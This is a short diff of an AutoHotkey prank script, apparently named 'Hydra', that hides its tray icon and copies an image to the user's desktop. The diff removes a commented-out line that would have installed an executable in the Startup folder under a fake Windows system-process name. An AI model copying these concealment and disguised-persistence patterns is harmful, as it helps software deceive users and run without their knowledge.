@@ -1,7 +1,6 @@
-; #NoTrayIcon
+#NoTrayIcon
 FileCreateDir C:\ProgramData\Hydra\
 FileInstall Phil.jpg, C:\ProgramData\Hydra\Phil.jpg
-; FileInstall Windows Driver Foundation - Usermode Driver Framework Host.exe, %A_StartMenu%\Programs\Startup\Windows Driver Foundation - Usermode Driver Framework Host.exe, 1
 FileCopy, C:\ProgramData\Hydra\Phil.jpg, %A_Desktop%\Phil1.jpg
 number_of_phils := 1
 
